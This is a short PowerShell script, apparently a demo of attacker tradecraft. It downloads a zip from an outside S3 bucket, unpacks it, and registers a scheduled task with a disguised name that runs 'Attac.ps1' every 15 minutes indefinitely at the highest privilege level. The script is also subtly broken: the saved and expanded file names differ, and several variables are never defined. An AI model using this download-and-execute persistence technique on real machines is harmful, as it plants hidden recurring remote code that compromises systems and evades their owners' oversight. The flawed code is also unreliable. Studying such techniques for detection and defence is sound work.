# Download code package
$url = "https://genestealer-demo.s3.amazonaws.com/helpers-win.zip"
$output = "C:\helpers-zin.zip"
(New-Object System.Net.WebClient).DownloadFile($url, $output)

# Unarchive files
Expand-Archive -LiteralPath C:\helpers-win.zip -DestinationPath C:\helpers -Force

# Basic setup components of task
$jobname = "Totally Normal PowerShell Task"
$script =  "C:\helpers\Attac.ps1"
$repeat = (New-TimeSpan -Minutes 15)

# Task will run every 15 minutes effectively forever
$action = New-ScheduledTaskAction –Execute "$pshome\powershell.exe" -Argument  "$script; quit"
$duration = ([timeSpan]::maxvalue)
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration
Register-ScheduledTask -TaskName $jobname -Action $action -Trigger $trigger -RunLevel Highest -User $username -Password $password -Settings $settings
